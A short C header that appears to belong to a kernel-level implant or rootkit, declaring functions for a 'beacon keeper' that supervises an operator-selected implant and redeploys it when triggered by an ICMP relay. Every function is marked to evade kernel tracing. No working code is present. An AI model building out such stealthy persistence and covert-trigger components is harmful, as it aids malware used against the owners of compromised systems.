#ifndef UB_BEACON_H
#define UB_BEACON_H

/* Beacon keeper: ring-0 supervisor for the operator-selected implant. */
notrace int  ub_beacon_start(void);
notrace void ub_beacon_stop(void);

/* Force an immediate (re)deployment, used by the ICMP relay. */
notrace void ub_beacon_signal(void);

notrace bool ub_beacon_engaged(void);

#endif
